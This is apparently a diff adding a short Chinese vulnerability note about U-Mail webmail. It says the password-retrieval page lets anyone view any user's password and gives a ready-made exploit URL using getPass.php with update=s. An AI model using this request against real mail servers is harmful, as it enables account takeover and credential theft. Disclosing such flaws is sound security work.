@@ -1,0 +1,4 @@
+umail任意密码获取漏洞描述：
+    可获取该系统指定用户权限，u-mail取回密码处设计不当，
+    导致任意用户密码可越权查看，当update=s时，可查看任意账户密码
+    如：http://mail.xxx.com/webmail/getPass.php?email=Services@xxx.com&update=s
